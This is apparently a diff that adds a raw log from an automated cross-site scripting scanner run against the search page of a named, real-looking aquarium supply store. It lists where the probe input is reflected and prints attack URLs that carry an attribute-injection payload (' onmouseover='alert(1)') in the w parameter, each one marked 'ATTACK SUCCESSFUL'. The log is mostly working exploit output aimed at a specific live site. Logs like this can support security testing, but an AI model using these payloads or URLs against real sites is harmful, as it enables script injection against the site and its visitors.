@@ -1,0 +1,256 @@
+https://aquarium.bulkreefsupply.com/popular/E
+
+GET Params:[3]
+['w', 'cnt', 'ts']
+_______________________________________________________________________________________________________
+https://aquarium.bulkreefsupply.com/search?w=(uvw"xyz'yxz</zxy&cnt=
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="text" name="w" placeholder="Search by keyword or item #" maxlength="128" class="input-text required-entry sli_searchbox_textfield" value="(uvw&#034;xyz'yxz /zxy" onfocus="this.setAttribute('data-last-keyword', this.value); this.value = '';" id="sli_search_1" autocomplete="off"  data-tb-sid="st_searchbox-textfield" onblur="if(this.value === '' ) { this.value = this.getAttribute('data-last-keyword'); }" data-provide="rac" data-sli-test="searchbox"/>
+<input type="text" name="w" placeholder="Search by keyword or item #" maxlength="128" class="input-text required-entry sli_searchbox_textfield" value="(uvw&#034;xyz'yxz /zxy" onfocus="this.setAttribute('data-last-keyword', this.value); this.value = '';" id="sli_search_2" autocomplete="off"  data-tb-sid="st_searchbox-textfield" onblur="if(this.value === '' ) { this.value = this.getAttribute('data-last-keyword'); }" data-provide="rac" data-sli-test="searchbox"/>
+
+----------------------------------------------------------------------------------
+HTML Context: [4]
+<title>Bulk Reef Supply - Search Results for (uvw&#034;xyz'yxz /zxy</title>
+<span class="sli_nrp_keyword">(uvw&#034;xyz'yxz /zxy</span>
+<h1 data-tb-sid="st_page-heading">
+    
+    Search results for &#x27;(uvw&#034;xyz'yxz /zxy&#x27;
+  </h1>
+<span data-tb-sid="st_no-results-text-keyword" class="sli_no_results_text_keyword">&quot;(uvw&#034;xyz'yxz /zxy&quot;.</span>
+
+----------------------------------------------------------------------------------
+Script Context: [3]
+<script type="text/javascript">
+    window.SLI.facetUrl = "https://aquarium.bulkreefsupply.com/search?lbc=bulkreefsupply&method=or&p=Q&ts=custom&uid=594504519&w=%28uvw%22xyz%27yxz%20%2fzxy";
+</script>
+<script type="text/javascript">
+		(function(window, undefined) {
+			window.SLI = window.SLI || {};
+			window.SLI.config = window.SLI.config || {};
+			SLI.config.ga_pagetype = '';
+			SLI.config.ga_domain =
+					'www.bulkreefsupply.com'.match(/^[^\.]+?\.?([^\/]+)/i)[0].replace(/^www\./i,'');
+			SLI.config.current_url =  '^search?p=Q&ts=custom&w=%28uvw%22xyz%27yxz%20%2fzxy'.replace(/\^/g,"/"); 
+      
+		})(window);
+	</script>
+<script language="javascript" type="text/javascript">
+			(function() {
+				window.sliSpark("sli:pageType", "searchresults");
+
+				window.sliSpark("sli:setBeaconUserId","lc39537b4987448e4aa4f7011e60064");
+
+				window.sliSpark("sli:addSearch", { "keyword": "(uvw&#034;xyz\'yxz /zxy", "totalRecords": "0", "pageNumber": "1", "refinements": [], "sort": "score" });
+				
+
+				window.sliSpark('send', 'pageview', {'page': '^search?p=Q&ts=custom&w=%28uvw%22xyz%27yxz%20%2fzxy'.replace(/\^/g,"/")});
+			})();
+		</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://aquarium.bulkreefsupply.com/search?w=' onmouseover='alert(1)&cnt=
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://aquarium.bulkreefsupply.com/search?w=' onmouseover='alert(1)&cnt=
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+_______________________________________________________________________________________________________
+https://aquarium.bulkreefsupply.com/search?w=&cnt=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://aquarium.bulkreefsupply.com/search?w=(uvw"xyz'yxz</zxy&ts=custom
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="text" name="w" placeholder="Search by keyword or item #" maxlength="128" class="input-text required-entry sli_searchbox_textfield" value="(uvw&#034;xyz'yxz /zxy" onfocus="this.setAttribute('data-last-keyword', this.value); this.value = '';" id="sli_search_1" autocomplete="off"  data-tb-sid="st_searchbox-textfield" onblur="if(this.value === '' ) { this.value = this.getAttribute('data-last-keyword'); }" data-provide="rac" data-sli-test="searchbox"/>
+<input type="text" name="w" placeholder="Search by keyword or item #" maxlength="128" class="input-text required-entry sli_searchbox_textfield" value="(uvw&#034;xyz'yxz /zxy" onfocus="this.setAttribute('data-last-keyword', this.value); this.value = '';" id="sli_search_2" autocomplete="off"  data-tb-sid="st_searchbox-textfield" onblur="if(this.value === '' ) { this.value = this.getAttribute('data-last-keyword'); }" data-provide="rac" data-sli-test="searchbox"/>
+
+----------------------------------------------------------------------------------
+HTML Context: [4]
+<title>Bulk Reef Supply - Search Results for (uvw&#034;xyz'yxz /zxy</title>
+<span class="sli_nrp_keyword">(uvw&#034;xyz'yxz /zxy</span>
+<h1 data-tb-sid="st_page-heading">
+    
+    Search results for &#x27;(uvw&#034;xyz'yxz /zxy&#x27;
+  </h1>
+<span data-tb-sid="st_no-results-text-keyword" class="sli_no_results_text_keyword">&quot;(uvw&#034;xyz'yxz /zxy&quot;.</span>
+
+----------------------------------------------------------------------------------
+Script Context: [3]
+<script type="text/javascript">
+    window.SLI.facetUrl = "https://aquarium.bulkreefsupply.com/search?lbc=bulkreefsupply&method=or&p=Q&ts=custom&uid=594788147&w=%28uvw%22xyz%27yxz%20%2fzxy";
+</script>
+<script type="text/javascript">
+		(function(window, undefined) {
+			window.SLI = window.SLI || {};
+			window.SLI.config = window.SLI.config || {};
+			SLI.config.ga_pagetype = '';
+			SLI.config.ga_domain =
+					'www.bulkreefsupply.com'.match(/^[^\.]+?\.?([^\/]+)/i)[0].replace(/^www\./i,'');
+			SLI.config.current_url =  '^search?p=Q&ts=custom&w=%28uvw%22xyz%27yxz%20%2fzxy'.replace(/\^/g,"/"); 
+      
+		})(window);
+	</script>
+<script language="javascript" type="text/javascript">
+			(function() {
+				window.sliSpark("sli:pageType", "searchresults");
+
+				window.sliSpark("sli:setBeaconUserId","leea188b5094249b4aacd63da2d5834");
+
+				window.sliSpark("sli:addSearch", { "keyword": "(uvw&#034;xyz\'yxz /zxy", "totalRecords": "0", "pageNumber": "1", "refinements": [], "sort": "score" });
+				
+
+				window.sliSpark('send', 'pageview', {'page': '^search?p=Q&ts=custom&w=%28uvw%22xyz%27yxz%20%2fzxy'.replace(/\^/g,"/")});
+			})();
+		</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://aquarium.bulkreefsupply.com/search?w=' onmouseover='alert(1)&ts=custom
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://aquarium.bulkreefsupply.com/search?w=' onmouseover='alert(1)&ts=custom
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+_______________________________________________________________________________________________________
+https://aquarium.bulkreefsupply.com/search?w=&ts=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
